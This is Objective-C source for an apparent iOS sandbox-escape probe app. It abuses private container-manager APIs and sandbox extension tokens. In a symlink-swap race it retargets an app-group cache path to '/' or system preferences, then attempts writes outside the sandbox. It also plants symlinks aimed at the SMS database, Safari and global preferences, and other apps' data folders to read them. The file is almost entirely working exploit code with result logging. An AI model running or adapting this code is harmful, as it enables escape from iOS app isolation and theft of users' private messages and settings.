// MCMZ — deterministic split-token test + no-token symlink reads + part sweep
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <dlfcn.h>
#import <dirent.h>
#import <unistd.h>
#import <errno.h>
#import <sys/stat.h>
#import <string.h>

typedef void *(*fn_create)(void);
typedef void (*fn_set_u64)(void *, uint64_t);
typedef void (*fn_set_obj)(void *, void *);
typedef void *(*fn_get_one)(void *);
typedef char *(*fn_copy_token)(void *);
typedef const char *(*fn_get_path)(void *);
typedef void (*fn_free)(void *);
typedef int64_t (*fn_consume)(const char *);
typedef int64_t (*fn_release)(int64_t);
typedef void *(*fn_xpc_string)(const char *);
typedef void (*fn_xpc_release)(void *);

static fn_create q_create; static fn_set_u64 q_class,q_part,q_flags; static fn_set_obj q_group;
static fn_get_one q_get; static fn_copy_token q_token; static fn_get_path q_path; static fn_free q_free;
static fn_consume s_consume; static fn_release s_release; static fn_xpc_string xpc_string; static fn_xpc_release xpc_release_fn;
static NSMutableString *gLog; static NSString *gPath; static NSString *gGroup,*gPart,*gValid,*gRoot;

static void L(NSString *fmt, ...) {
    va_list ap; va_start(ap, fmt);
    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
    va_end(ap);
    [gLog appendString:s]; [gLog appendString:@"\n"];
    [gLog writeToFile:gPath atomically:YES encoding:NSUTF8StringEncoding error:nil];
    NSLog(@"[mcmz] %@", s);
}
static BOOL loadMCM(void){void*h=dlopen("/usr/lib/system/libsystem_containermanager.dylib",RTLD_NOW|RTLD_LOCAL);if(!h){L(@"dlopen fail %s",dlerror());return NO;}q_create=dlsym(h,"container_query_create");q_class=dlsym(h,"container_query_set_class");q_group=dlsym(h,"container_query_set_group_identifiers");q_part=dlsym(h,"container_query_operation_set_part");q_flags=dlsym(h,"container_query_operation_set_flags");q_get=dlsym(h,"container_query_get_single_result");q_token=dlsym(h,"container_copy_sandbox_token");q_path=dlsym(h,"container_object_get_path");q_free=dlsym(h,"container_query_free");s_consume=dlsym(RTLD_DEFAULT,"sandbox_extension_consume");s_release=dlsym(RTLD_DEFAULT,"sandbox_extension_release");xpc_string=dlsym(RTLD_DEFAULT,"xpc_string_create");xpc_release_fn=dlsym(RTLD_DEFAULT,"xpc_release");L(@"[load] create=%p get=%p tok=%p consume=%p",q_create,q_get,q_token,s_consume);return q_create&&q_get&&q_token&&s_consume;}
static NSString *findGroup(void){NSArray*ids=@[@"group.8e0bc870a21520b9.1",@"group.8e0bc870a21520b9.4",@"group.8e0bc870a21520b9.5",@"group.8e0bc870a21520b9.3",@"group.8e0bc870a21520b9.2"];for(NSString*g in ids){NSURL*u=[[NSFileManager defaultManager]containerURLForSecurityApplicationGroupIdentifier:g];if(u.path.length)return g;}return nil;}
static void swapTo(NSString *target){unlink(gPart.fileSystemRepresentation);int rc=symlink(target.fileSystemRepresentation,gPart.fileSystemRepresentation);L(@"[swap] -> %@ rc=%d errno=%d",target,rc,errno);}
static void trywrite(NSString *tag, NSString *path){errno=0;int fd=open(path.fileSystemRepresentation,O_CREAT|O_WRONLY|O_TRUNC,0644);int e=errno;L(@"[w %@] open=%d errno=%d %@",tag,fd,e,path);if(fd>=0){ssize_t n=write(fd,"MCMZ_WIN",8);close(fd);struct stat st;int lr=lstat(path.fileSystemRepresentation,&st);L(@"[w %@] *** WRITE OK *** n=%zd size=%lld",tag,n,lr?0:(long long)st.st_size);}}
static void tryread(NSString *tag, NSString *path){errno=0;int fd=open(path.fileSystemRepresentation,O_RDONLY);int e=errno;if(fd>=0){char b[24]={0};ssize_t n=read(fd,b,23);L(@"[r %@] fd=%d n=%zd first=%s",tag,fd,n,n>0?b:"");close(fd);}else L(@"[r %@] fd=-1 errno=%d %@",tag,e,path);}
static void trydir(NSString *tag, NSString *path){errno=0;DIR*d=opendir(path.fileSystemRepresentation);int e=errno;L(@"[d %@] DIR=%p errno=%d %@",tag,d,e,path);if(d)closedir(d);}

static int64_t queryPart(int cls, int part, const char *ident, NSString **pathOut){
    void*q=q_create(); q_class(q,cls);
    void*x=xpc_string?xpc_string(ident):NULL;
    if(cls==7||cls==12||cls==2||cls==13) q_group(q,x);
    q_part(q,part); q_flags(q,0x8000000000ULL);
    void*res=q_get(q);
    const char*p=(res&&q_path)?q_path(res):NULL;
    char*tok=(res&&q_token)?q_token(res):NULL;
    int64_t h=(tok&&s_consume)?s_consume(tok):-5;
    if(pathOut)*pathOut=p?[NSString stringWithUTF8String:p]:nil;
    if(tok)free(tok);
    if(q_free)q_free(q);
    if(x&&xpc_release_fn)xpc_release_fn(x);
    return h;
}

static void splitTest(NSString *target){
    L(@"[split] === target %@ ===",target);
    swapTo(gValid);
    void*q=q_create(); q_class(q,7);
    void*x=xpc_string?xpc_string(gGroup.UTF8String):NULL;
    q_group(q,x); q_part(q,3); q_flags(q,0x8000000000ULL);
    void*res=q_get(q);
    const char*p1=(res&&q_path)?q_path(res):NULL;
    L(@"[split] q_get=%p path_before=%@",res,p1?[NSString stringWithUTF8String:p1]:@"(null)");
    if(!res){ if(q_free)q_free(q); if(x)xpc_release_fn(x); swapTo(gValid); return; }
    swapTo(target);
    const char*p2=q_path?q_path(res):NULL;
    L(@"[split] path_after_swap=%@",p2?[NSString stringWithUTF8String:p2]:@"(null)");
    char*tok=q_token?q_token(res):NULL;
    int64_t h=(tok&&s_consume)?s_consume(tok):-5;
    L(@"[split] token=%p consume=%lld",tok,(long long)h);
    trywrite([NSString stringWithFormat:@"split-%@",target],[gPart stringByAppendingPathComponent:@"tmp/mcmz_split"]);
    tryread(@"split-globalprefs",[gPart stringByAppendingPathComponent:@"var/mobile/Library/Preferences/com.apple.mobilesafari.plist"]);
    trywrite([NSString stringWithFormat:@"abs-%@",target],[target stringByAppendingPathComponent:@"mcmz_abs"]);
    if(tok)free(tok);
    if(q_free)q_free(q);
    if(x&&xpc_release_fn)xpc_release_fn(x);
    if(h>=0&&s_release)s_release(h);
    swapTo(gValid);
}

static void readPhase(void){
    NSString *rd=[gRoot stringByAppendingPathComponent:@"probe_rd"];
    NSString *rs=[gRoot stringByAppendingPathComponent:@"probe_root"];
    NSString *rm=[gRoot stringByAppendingPathComponent:@"probe_sms"];
    unlink(rd.fileSystemRepresentation); unlink(rs.fileSystemRepresentation); unlink(rm.fileSystemRepresentation);
    symlink("/var/mobile/Library/Preferences",rd.fileSystemRepresentation);
    symlink("/",rs.fileSystemRepresentation);
    symlink("/var/mobile/Library/SMS",rm.fileSystemRepresentation);
    tryread(@"direct-global",@"/var/mobile/Library/Preferences/.GlobalPreferences.plist");
    tryread(@"sym-global",[rd stringByAppendingPathComponent:@".GlobalPreferences.plist"]);
    tryread(@"direct-safari",@"/var/mobile/Library/Preferences/com.apple.mobilesafari.plist");
    tryread(@"sym-safari",[rd stringByAppendingPathComponent:@"com.apple.mobilesafari.plist"]);
    tryread(@"direct-sms",@"/var/mobile/Library/SMS/sms.db");
    tryread(@"sym-sms",[rm stringByAppendingPathComponent:@"sms.db"]);
    tryread(@"symroot-sms",[rs stringByAppendingPathComponent:@"var/mobile/Library/SMS/sms.db"]);
    trydir(@"direct-prefs-dir",@"/var/mobile/Library/Preferences");
    trydir(@"sym-prefs-dir",rd);
    trydir(@"direct-appdata",@"/var/mobile/Containers/Data/Application");
    trydir(@"symroot-appdata",[rs stringByAppendingPathComponent:@"var/mobile/Containers/Data/Application"]);
}

static void partPhase(void){
    L(@"[part] === part sweep group=%@ ===",gGroup);
    for(int p=0;p<=8;p++){
        NSString *path=nil; int64_t h=queryPart(7,p,gGroup.UTF8String,&path);
        L(@"[part] p=%d h=%lld path=%@",p,(long long)h,path?:@"(null)");
        if(h>=0&&s_release)s_release(h);
    }
}

static void run(void){
    @autoreleasepool {
        L(@"=== mcmz start uid=%d pid=%d",getuid(),getpid());
        if(!loadMCM())return;
        gGroup=findGroup(); if(!gGroup){L(@"no group");return;}
        gRoot=[[NSFileManager defaultManager] containerURLForSecurityApplicationGroupIdentifier:gGroup].path;
        gPart=[gRoot stringByAppendingPathComponent:@"Library/Caches"];
        gValid=@"/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/Library/Caches";
        NSFileManager *fm=[NSFileManager defaultManager];
        [fm createDirectoryAtPath:[gPart stringByDeletingLastPathComponent] withIntermediateDirectories:YES attributes:nil error:nil];
        [fm removeItemAtPath:gPart error:nil];
        readPhase();
        splitTest(@"/");
        splitTest(@"/var/mobile/Library/Preferences");
        swapTo(gValid);
        partPhase();
        L(@"=== mcmz done ===");
    }
}

@interface AppDelegate:UIResponder<UIApplicationDelegate>@property(strong,nonatomic)UIWindow*window;@end
@implementation AppDelegate
- (BOOL)application:(UIApplication*)app didFinishLaunchingWithOptions:(NSDictionary*)opts{
    self.window=[[UIWindow alloc]initWithFrame:[UIScreen mainScreen].bounds];
    UIViewController*vc=[UIViewController new]; vc.view.backgroundColor=UIColor.blackColor;
    UITextView*tv=[[UITextView alloc]initWithFrame:vc.view.bounds]; tv.backgroundColor=UIColor.blackColor; tv.textColor=UIColor.greenColor; tv.font=[UIFont monospacedSystemFontOfSize:9 weight:UIFontWeightRegular]; tv.editable=NO; tv.text=@"MCMZ"; [vc.view addSubview:tv];
    self.window.rootViewController=vc; [self.window makeKeyAndVisible];
    [UIApplication sharedApplication].idleTimerDisabled=YES;
    NSString*docs=[NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,NSUserDomainMask,YES)firstObject];
    gPath=[[docs stringByAppendingPathComponent:@"mcmz.log"]copy]; gLog=[NSMutableString new];
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED,0),^{run();dispatch_async(dispatch_get_main_queue(),^{tv.text=gLog;});});
    return YES;
}
@end
int main(int argc,char**argv){@autoreleasepool{return UIApplicationMain(argc,argv,nil,NSStringFromClass([AppDelegate class]));}}
